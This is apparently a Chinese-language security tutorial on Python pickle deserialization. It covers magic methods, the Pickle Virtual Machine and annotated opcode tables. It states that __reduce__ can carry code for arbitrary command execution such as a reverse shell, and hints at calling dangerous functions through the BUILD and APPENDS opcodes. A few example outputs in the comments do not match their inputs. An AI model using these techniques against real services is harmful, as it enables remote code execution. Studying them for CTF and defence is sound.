<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="f5f219582ca837ae09f87d5f612fa26e">pickle反序列化</h2>
<h3 data-content="1" id="61df227d11048d5f7e33f4a77b64d1c1">简介</h3>
<p>pickle是Python的一个库,可以对一个对象进行序列化和反序列化操作.其中<code>__reduce__</code>魔法函数会在一个对象被反序列化时自动执行,我们可以通过在<code>__reduce__</code>魔法函数内植入恶意代码的方式进行任意命令执行.通常会利用到Python的反弹shell.</p>
<h3 data-content="1" id="dbee9c9bc0ca792bee2c820dc8452b59">前置知识</h3>
<h4 data-content="1" id="3c05dd0db422e7508d1381a776462035">python对象</h4>
<p>在python中,对象的概念十分广泛.</p>
<blockquote>
<p>对象是数据和功能的结合体。Python是一种面向对象编程语言，它使用对象来组织代码和数据。在Python中，几乎所有的东西都是对象，包括整数、浮点数、列表、元组、字典、函数、类等。</p>
</blockquote>
<p>一个Python对象通常包含以下部分：</p>
<ol>
<li>
<strong>身份（Identity）</strong>：每个对象都有一个唯一的身份标识，通常是它的内存地址。可以使用内建函数<code>id()</code>来获取对象的身份。</li>
<li>
<strong>类型（Type）</strong>：对象属于某种类型，比如整数、浮点数、字符串、列表等。可以使用内建函数<code>type()</code>来获取对象的类型。</li>
<li>
<strong>值（Value）</strong>：对象所持有的数据。不同类型的对象有不同的值。例如，整数对象的值是整数值，字符串对象的值是字符序列。</li>
<li>
<strong>属性（Attributes）</strong>：对象可以有零个或多个属性，这些属性是附加到对象上的数据。属性通常用于存储对象的状态信息。</li>
<li>
<strong>方法（Methods）</strong>：对象可以有零个或多个方法，方法是附加到对象上的函数。这些方法定义了对象可以执行的操作。</li>
</ol>
<h4 data-content="1" id="55c5fed85326053266000ee7feadf828">Python面向对象</h4>
<p>python是一门面向对象的语言.也正因为python面向对象的特性,使得我们有更加丰富的选择进行绕过.</p>
<p>在Python中,面向对象的思想和php是一致的,只是定义类的代码,调用类函数和类属性的方式和php不同.</p>
<p>python中用<code>.</code>调用实例的属性和方法</p>
<p>python中存在类属性和实例属性,实例属性只对一个实例生效,类属性对一个类生效.定义实例属性的方法是用<code>__init__</code>魔术方法.调用类属性的方法是<code>类名.变量名</code>或者<code>self.__class__.变量名</code>.</p>
<p>同样地,python的面向对象也有私有属性,私有方法,类的继承等.</p>
<h4 data-content="1" id="aac9abaac21f28dbea6f9c6e6d7adf2b">序列化和反序列化</h4>
<p>序列化就是将一个对象转换为以字符串方式存储的过程,反序列化就是将字符串重新变为一个对象的实例.</p>
<blockquote>
<p>注意,在linux下和windows下进行序列化的操作的结果可能会有所不同,在做题时需要根据靶机的系统选择用windows还是linux进行序列化操作.</p>
</blockquote>
<h4 data-content="1" id="919b90e33e49e30c07d9e8b8d5540430">关于序列化和反序列化的函数</h4>
<ol>
<li><code>pickle.dump()</code></li>
<li><code>pickle.load()</code></li>
<li><code>pickle.dumps()</code></li>
<li><code>pickle.loads()</code></li>
</ol>
<p>其中两个dump函数是把python对象转换为二进制对象的,两个load函数是把二进制对象转换为python对象的.</p>
<p>而s函数是指对字符串进行反序列化和序列化操作,另外两个函数是对文件进行操作.</p>
<h4 data-content="1" id="171ba4f97869477617b66d0275080920">python魔术方法</h4>
<p>和php类似,python魔术方法也会在一些特定情况下被自动调用.我们尤其要注意的是<code>__reduce__</code>魔术方法,这会在反序列化过程开始时被调用,所以我们可以序列化一个<code>__reduce__</code>魔术方法中有系统命令的实例并且让服务器将它反序列化,从而达到任意命令执行的效果.</p>
<p>除此之外还有很多魔术方法.例如初始化函数<code>__init__</code>和构造函数<code>__new__</code>.和php类似,python中也有魔法属性.例如<code>__doc__</code>,<code>__name__</code>,<code>__class__</code>,<code>__base__</code>等.</p>
<p><code>pickle.loads()</code>会在反序列化一个实例时自动引入没有引入的库.</p>
<p>构造方法<code>__new__</code></p>
<ul>
<li>在实例化一个类时自动被调用,是类的构造方法.</li>
<li>可以通过重写<code>__new__</code>自定义类的实例化过程</li>
</ul>
<p>初始化方法<code>__init__</code></p>
<ul>
<li>在<code>__new__</code>方法之后被调用,主要负责定义类的属性,以初始化实例</li>
</ul>
<p>析构方法<code>__del__</code></p>
<ul>
<li>在实例将被销毁时调用</li>
<li>只在实例的所有调用结束后才会被调用</li>
</ul>
<p><code>__getattr__</code></p>
<ul>
<li>获取不存在的对象属性时被触发</li>
<li>存在返回值</li>
</ul>
<p><code>__setattr__</code></p>
<ul>
<li>设置对象成员值的时候触发</li>
<li>传入一个self,一个要设置的属性名称,一个属性的值</li>
</ul>
<p><code>__repr__</code></p>
<ul>
<li>在实例被传入<code>repr()</code>时被调用</li>
<li>必须返回字符串</li>
</ul>
<p><code>__call__</code></p>
<ul>
<li>把对象当作函数调用时触发</li>
</ul>
<p><code>__len__</code></p>
<ul>
<li>被传入<code>len()</code>时调用</li>
<li>返回一个整型</li>
</ul>
<p><code>__str__</code></p>
<ul>
<li>被<code>str()</code>,<code>format()</code>,<code>print()</code>调用时调用,返回一个字符串</li>
</ul>
<h4 data-content="1" id="949e445ed625c4c17139df606140ab1f">Python特殊属性</h4>
<ul>
<li>
<p>object.__dict__</p>
<p>一个字典或其他类型的映射对象，用于存储对象的（可写）属性。</p>
</li>
<li>
<p>instance._<em>class\</em>_</p>
<p>类实例所属的类。</p>
</li>
<li>
<p>class._<em>bases\</em>_</p>
<p>由类对象的基类所组成的元组。</p>
</li>
<li>
<p>definition._<em>name\</em>_</p>
<p>类、函数、方法、描述器或生成器实例的名称。</p>
</li>
<li>
<p>definition._<em>qualname\</em>_</p>
<p>类、函数、方法、描述器或生成器实例的 <a href="https://docs.python.org/zh-cn/3.11/glossary.html#term-qualified-name" target="_blank">qualified name</a>。</p>
</li>
</ul>
<h4 data-content="1" id="d498577a10d939bf4fa21f096188ee0c">栈</h4>
<p>栈是一种存储数据的结构.栈有压栈和弹栈两种操作.</p>
<p>可以把栈看做一个弹夹,先进栈的数据后出栈,压栈就像压子弹,弹栈就像弹子弹.</p>
<h4 data-content="1" id="7b6aa908b88c8207ea38dfab2e39de47">什么是PVM</h4>
<p>pickle是一种栈语言,它由一串串opcode（指令集）组成.该语言的解析是依靠Pickle Virtual Machine （PVM）进行的.</p>
<p>为什么要学习pickle?</p>
<blockquote>
<p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p>
</blockquote>
<p>PVM由以下三部分组成</p>
<ul>
<li>
<p>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</p>
</li>
<li>
<p>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</p>
</li>
<li>
<p>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</p>
</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240308140039-30733f0c-dd11-1.png"/></p>
<h4 data-content="1" id="f2233b22d671489457b59ab140487105">常用opcode</h4>
<p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p>
<table>
<thead>
<tr>
<th style="">指令</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="">c</td>
<td>获取一个全局对象或import一个模块</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td style="">o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td style="">i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td style="">N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td style="">S</td>
<td>实例化一个字符串对象</td>
<td>S'xxx'\n（也可以使用双引号、\'等python字符串形式）</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td style="">V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td style="">I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td style="">F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td style="">R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td style="">.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
</tr>
<tr>
<td style="">(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
</tr>
<tr>
<td style="">t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td style="">)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
</tr>
<tr>
<td style="">l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td style="">]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
</tr>
<tr>
<td style="">d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td style="">}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
</tr>
<tr>
<td style="">p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
</tr>
<tr>
<td style="">g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
</tr>
<tr>
<td style="">0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
</tr>
<tr>
<td style="">b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
</tr>
<tr>
<td style="">s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td style="">u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td style="">a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td style="">e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody>
</table>
<p>比较全的指令集</p>
<div class="highlight"><pre><span></span><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
<span class="c1"># here is in kind-of alphabetical order of 1-character pickle code.</span>
<span class="c1"># pickletools groups them by purpose.</span>
<span class="c1"># 说明:</span>
<span class="c1"># 1.如果对栈顶元素只说了取出,而没有说弹出的话那就说明只是将栈顶元素复制一份放到一个变量或者就是后面的操作对栈顶元素进行更新修改,但是这个栈顶元素是不会弹出的</span>
<span class="c1"># 2.部分说明中对数据进行操作先弹出然后进行操作再进行压栈,但是对照源码可能是对栈数组直接进行直接截取而并没有pop弹出或者append的压栈操作,我这里描述为弹出和压栈的过程是为了便于理解</span>
<span class="c1"># 3.用于指定后面需要读取的数据大小的字节读出来之后,有可能是按照字符字面大小读取,也可能是按照其16进制大小进行数据读取,例如字符'1'='\x31',0x31=49可能是读取1字节大小也肯能是读取49字节大小,注意我的注释描述</span>
<span class="c1"># 4._struct.unpack解压&lt;i格式数据的时候需要传入4字节大小的数据,然后会把4个字节左右顺序调换,得到一个8位的16进制数,最后将其转为一个10进制整数,例如_struct.unpack('&lt;i', b'\x00\x01\x00\x00')[0]=&gt;0x00001000=&gt;256</span>
<span class="c1"># 5.struct.unpack解压&lt;Q格式数据则是需要传入8字节大小数据,转换操作同上,例如unpack('&lt;Q', b'\x00\x01\x00\x00\x00\x00\x00\x00')[0] =&gt; 0x0000000000000100 =&gt; 256</span>
<span class="n">MARK</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'('</span>   <span class="c1">#向栈中压入一个Mark标记</span>
<span class="n">STOP</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'.'</span>   <span class="c1">#相当于停止当前的反序列化过程</span>
<span class="n">POP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'0'</span>   <span class="c1">#从栈中pop出一个元素,就是删除栈顶元素</span>
<span class="n">POP_MARK</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'1'</span>   <span class="c1">#从栈中不断pop元素直到遇到Mark标记</span>
<span class="n">DUP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'2'</span>   <span class="c1">#向栈中再压入一个当前的栈顶元素,就是复制一份当前栈顶元素然后进行压栈</span>
<span class="n">FLOAT</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'F'</span>   <span class="c1">#读取当前行到行末尾,然后转为float类型,向栈中压入一个float浮点数</span>
<span class="n">INT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'I'</span>   <span class="c1">#向栈中压入一个int整数,整数就是当前行的最后一个字节,不过如果整数为01的时候压入的是True,为00的时候压入的是False</span>
<span class="n">BININT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'J'</span>   <span class="c1">#从后面的输入中读取4个字节并且使用unpack通过'&lt;i'的格式将4字节的buffer数据解包转为int类型,后面不能换行,直接家下一步的操作b"(S'a'\nK\x01\x01\x01\x01."</span>
<span class="n">BININT1</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'K'</span>   <span class="c1">#和上面BININT一样,不过K操作只读取一个字节的数据b"(S'a'\nK\x01."</span>
<span class="n">LONG</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'L'</span>   <span class="c1">#读取当前行到行末尾,然后转为int类型,但如果后面是字符L的话会先去掉最后一个字符L再转int</span>
<span class="n">BININT2</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'M'</span>   <span class="c1">#从后面的输入中读取2个字节并且使用unpack通过'&lt;H'的格式将2字节的buffer作为一个2进制数解包为int,后面不能换行,直接加下一步的操作b"(S'a'\nM\x01\x01."</span>
<span class="n">NONE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'N'</span>   <span class="c1">#向栈中压入一个None元素,后面不能换行,直接加下一步的操作b"(S'a'\nN."</span>
<span class="n">PERSID</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'P'</span>   <span class="c1">#读取当前行到行末尾,将读取到的数据作为id,通过persistent_load函数获得obj对象返回后将obj对象压栈,默认情况没用,要重写persistent_load函数才能生效</span>
<span class="n">BINPERSID</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'Q'</span>   <span class="c1">#和上面作用一样,从当前栈中弹出一个元素作为id,通过persistent_load...</span>
<span class="n">REDUCE</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'R'</span>   <span class="c1">#从当前栈中弹出两次元素,第一次是函数参数args,第二次是函数func,执行func(args)</span>
<span class="n">STRING</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'S'</span>   <span class="c1">#向栈中压入一个string字符串,内容就是后面的数据,后面的字符串第一个和最后一个必须是单引号b"(S'a'\nS''a''\n."</span>
<span class="n">BINSTRING</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'T'</span>   <span class="c1">#从后面数据读取4字节数据,通过unpack使用&lt;i格式将数据解压后变为int类型, 然后将其作为一个长度, 后面读取这个指定长度的数据作为字符串进行压栈b"(S'a'\nT\x10\x00\x00\x000123456789abcdef."</span>
<span class="c1"># _struct.unpack('&lt;i', b"\x10\x00\x00\x00") =&gt; (16,)</span>
<span class="n">SHORT_BINSTRING</span><span class="o">=</span> <span class="sa">b</span><span class="s1">'U'</span>   <span class="c1">#先读取一个字节数据作为长度,然后按照这个长度读取字符串,读出的字符串压栈</span>
<span class="n">UNICODE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'V'</span>   <span class="c1">#读出当前行后面的全部数据,然后进行Unicode解码,将解码内容压栈b'V\\u0061\n.'</span>
<span class="n">BINUNICODE</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'X'</span>   <span class="c1">#读出4字节数据通过unpack使用&lt;I格式解压,将解压得到的数据作为长度,然后进行数据读取b'X\x10\x00\x00\x00abcdef0123456789.'</span>
<span class="n">APPEND</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span>   <span class="c1">#先pop出栈一个变量var1,然后获取当前栈顶元素var2,执行栈顶元素的append函数,就是将一开始的栈顶元素弹出,然后又加到下一个栈顶数组中b"]S'S1nKk'\na." =&gt; 得到['S1nKk']</span>
<span class="n">BUILD</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'b'</span>   <span class="c1">#这个操作就是设置元素属性的操作</span>
<span class="c1"># 先pop出栈一个变量var1,然后获取当前栈顶元素var2,获取var2的__setstate__子成员作为var3,如果var3非空,那就执行var3(var1),这个操作正常就是通过__setstate__设置变量的属性</span>
<span class="c1"># 但是上面的var3为空也有别的处理:</span>
<span class="c1"># 1.检查var1是否为tuple类型且长度为2,如果是的话那就将其分别赋值为state,slotstate</span>
<span class="c1"># 2.检查state是否为空,如果不为空尝试取出state.items()然后使用k,v键值对的方式便利,最后通过修改var2.__dict__的方式修改var2的属性,也就是使得var2[k]=v,var2.k=v</span>
<span class="c1"># 3.检查slotstate是否为空,如果不为空和第2步一样,取出slotstate.items()通过k,v键值对方式遍历,然后使用setattr方法设置var2属性,最后效果也是var2[k]=v,var2.k=v</span>
<span class="n">GLOBAL</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'c'</span>   <span class="c1">#导入一个模块,首先读取当前行后面的全部内容适应utf-8解码得到的字符串作为module,然后再读出下一行的内容同样解析出字符串作为那么,最后导入module.name这个包</span>
<span class="n">DICT</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'d'</span>   <span class="c1">#将栈中的数据弹出到上一个Mark为止,然后按照key:value的方式逐个解析然后放入到一个字典中,将最后得到的字典压栈b"(S'key1'\nS'val1'\nS'key2'\nS'val2'\nd." =&gt; {'key1': 'val1', 'key2': 'val2'}</span>
<span class="n">EMPTY_DICT</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'}'</span>   <span class="c1">#没什么好说的,就是往栈中压入一个空字典</span>
<span class="n">APPENDS</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'e'</span>   <span class="c1">#先将栈中元素不断弹出知道Mark标记,然后将弹出的全部元素放入items中,再取出栈顶作为list_obj,之后执行下面两步操作:</span>
<span class="c1"># 1.先取出extend=list_obj.extend,然后执行extend(items)</span>
<span class="c1"># 2.取出append = list_obj.append,然后使用for循环遍历items得到item,然后每次循环都执行一次append(item)</span>
<span class="c1"># 看到这里应该想到函数触发的方法,我们只需要使用b操作将list_obj的extend改为一个危险的函数方法,然后再让参数进入items,就可以通过extend(items)的方式调用任意构造的危险函数了</span>
<span class="n">GET</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'g'</span>   <span class="c1">#读取后面的全部本行数据,然后转为int类型放入变量i中,使用i作为索引,从缓存区取出数据mem[i],然后将这个从缓存中取出的变量压栈</span>
<span class="n">BINGET</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'h'</span>   <span class="c1">#后面读取一个字节的数据,然后使用字符16进制大小作为下标索引,从缓存mem中读数据,将读出的内容压栈,下面就是一个获取缓存中下标为1的数据的实例b"S'h0cksr'\np1\nS't'\n0h\x01."</span>
<span class="n">INST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'i'</span>   <span class="c1">#两次pop出栈读出数据并且均进行解码操作使其变为字符串格式,</span>
<span class="c1"># 1. 第一第二次弹出的数据分别放入module和name中,先导入moudle模块,然后name通过.逐个获取出里面的子成员,最后返回目标子成员(可能是函数也可能是类或变量)var1</span>
<span class="c1"># 2. 继续进行出栈,直到遇到Mark标志,将出栈的数据作为参数,var1位方法,执行var1(Mark弹出数据)</span>
<span class="c1"># 3. 将生成的实例化对象压栈</span>
<span class="n">LONG_BINGET</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">'j'</span>   <span class="c1">#先读出4字节大小数据流,然后通过unpack使用&lt;I格式解压得到int类型数据i,将i作为下标,从缓存中获取变量mem[i],将获取到的数据压栈</span>
<span class="n">LIST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'l'</span>   <span class="c1">#将上一次Mark之后的数据全部弹出,并且将其存放到一个数组中,然后在将这个数组压栈b"(S'S1nKk'\np1\nS't'\nl."</span>
<span class="n">EMPTY_LIST</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">']'</span>   <span class="c1">#没什么好说,往栈中压入一个空数组</span>
<span class="n">OBJ</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'o'</span>   <span class="c1">#先是将上一次Mark之后的数据全部弹出,得到一个数组var1,然后又在var1中pop取出最后一个数据作为var2,之后执行以下过程:</span>
<span class="c1"># 1.检查弹出数据后的var1数组是否为空,如果var1非空,或者弹出的var2属于type类型,或者弹出的var2有__getinitargs__属性成员,那么就会执行var2(var1)</span>
<span class="c1"># 2.如果以上条件均不满足,那就执行var2.__new__(var2)</span>
<span class="c1"># 3.将执行结果压入栈中</span>
<span class="n">PUT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'p'</span>   <span class="c1">#读取后面全部当前行的数据,然后转为int类型的变量i,然后赋值当前栈顶元素存到memo[i]中</span>
<span class="n">BINPUT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'q'</span>   <span class="c1">#和上一个一样,不同的是下标i是通过读取1个字节的数据,然后直接当做下标</span>
<span class="n">LONG_BINPUT</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">'r'</span>   <span class="c1">#和上一个一样,不同的是下标i是通过读取4个字节的数据,然后通过unpack使用&lt;I模式解压得到的整数当做下标</span>
<span class="n">SETITEM</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'s'</span>   <span class="c1">#先在栈中pop弹出第一个数据作为value,然后在pop弹出第二个元素作为key,再获取当前栈顶元素记为dict,给栈顶元素赋值dict[key]=value</span>
<span class="n">TUPLE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'t'</span>   <span class="c1">#弹出上一次Mark之后的全部数据大农一个list数组中,然后使用tuple函数将其转为元组格式再把这个元组压入栈中</span>
<span class="n">EMPTY_TUPLE</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">')'</span>   <span class="c1">#没什么好说,往栈中压入一个空元组</span>
<span class="n">SETITEMS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'u'</span>   <span class="c1">#先弹出上一次Mark之后的全部元素放入一个数组items中,然后获取栈顶元素记为dict,通过i=0,2,3...获取items中的数据,执行dict[items[i]] = items[i + 1]给栈顶的字典元素添加键值对</span>
<span class="n">BINFLOAT</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'G'</span>   <span class="c1">#先读取8字节数据,然后使用unpack通过&lt;d格式的解压,将得到的float数据压栈</span>

<span class="n">TRUE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'I01</span><span class="se">\n</span><span class="s1">'</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
<span class="n">FALSE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'I00</span><span class="se">\n</span><span class="s1">'</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>

<span class="c1"># Protocol 2</span>

<span class="n">PROTO</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80</span><span class="s1">'</span>  <span class="c1">#用于声明pickle协议版本</span>
<span class="n">NEWOBJ</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x81</span><span class="s1">'</span><span class="c1">#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈</span>
<span class="n">EXT1</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x82</span><span class="s1">'</span>  <span class="c1">#'''\x82,\x83,\x84这三个操作都是和extension registry扩展注册表有关的,但是拓展注册表主要维护4个从copyreg导入的映射字典</span>
<span class="n">EXT2</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x83</span><span class="s1">'</span>  <span class="c1">#     dispatch_tablecopyreg, _extension_registry, _inverted_registry, _extension_cache</span>
<span class="n">EXT4</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x84</span><span class="s1">'</span>  <span class="c1">#     但是从头到尾貌似这几个核心表单都没有发生过变化(也可能是我没注意到而已)'''</span>
<span class="n">TUPLE1</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x85</span><span class="s1">'</span>  <span class="c1">#将栈顶元素弹出放到一个元组中再将这个元组压栈,就是将栈顶放到一个元组里面的作用b"S'S1nk'\n\x85." =&gt; ('S1nk',)</span>
<span class="n">TUPLE2</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x86</span><span class="s1">'</span>  <span class="c1">#将栈顶的两个元素弹出,栈顶弹出为var1,继续弹出一个为var2,然后组成一个元组然后将这个元组压栈,得到(var2,var1),b"S'S1nk'\nS'S1nKk'\n\x86." =&gt; ('S1nk', 'S1nKk')</span>
<span class="n">TUPLE3</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x87</span><span class="s1">'</span>  <span class="c1">#和上面一样,不够该操作是弹出三个元素形成元组b"S'S1nK'\nS'S11nK'\nS'S111nK'\n\x87." =&gt; ('S1nK', 'S11nK', 'S111nk')</span>
<span class="n">NEWTRUE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x88</span><span class="s1">'</span>  <span class="c1">#向栈中压入一个True</span>
<span class="n">NEWFALSE</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x89</span><span class="s1">'</span>  <span class="c1">#向栈中压入一个False</span>
<span class="n">LONG1</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8a</span><span class="s1">'</span>  <span class="c1">#先读取一个字节,以该字节16进制数为大小size,从后面的数据读取size个字节,然后将读取到的数据转为long类型</span>
<span class="n">LONG4</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8b</span><span class="s1">'</span>  <span class="c1">#读取4字节数据,通过unpack的&lt;i格式将数据解压得到一个整数,以这个整数为字节大小读取后面的数据</span>

<span class="n">_tuplesize2code</span> <span class="o">=</span> <span class="p">[</span><span class="n">EMPTY_TUPLE</span><span class="p">,</span> <span class="n">TUPLE1</span><span class="p">,</span> <span class="n">TUPLE2</span><span class="p">,</span> <span class="n">TUPLE3</span><span class="p">]</span><span class="c1">#就是元组操作合集,分别是向栈中压入空数组,将最后1个元素放入元组后将元组压栈,将最后2个元素放入元组后将元组压栈,将最后3个元素放入元组后将元组压栈</span>

<span class="c1"># Protocol 3 (Python 3.x)#这里要注意一下,后面的操作是有python3方才支持</span>

<span class="n">BINBYTES</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'B'</span>   <span class="c1">#先读取4字节数据通过unpack使用&lt;i格式将数据解压,将得到的结果作为大小向后读取相应字节数,然后将读取到的全部字节压栈,注意一下,压栈的是原始的比特流数据b'B\x06\x00\x00\x00h0cksr.' =&gt; b'S1nKk'</span>
<span class="n">SHORT_BINBYTES</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'C'</span>   <span class="c1">#读取一个字节,以它的16进制数作为大小向后读取对应字节的数据b'C\x06h0cksr.' =&gt; b'S1nKk'</span>

<span class="c1"># Protocol 4</span>
<span class="n">SHORT_BINUNICODE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8c</span><span class="s1">'</span>  <span class="c1">#先读取一个字节,以这个字节的16进制为大小向后读取对应字节的数据,然后使用utf-8的格式解码数据为字符串格式,然后将这个字符串压栈b'\x8c\x06S1nKk.' =&gt; S1nKk</span>
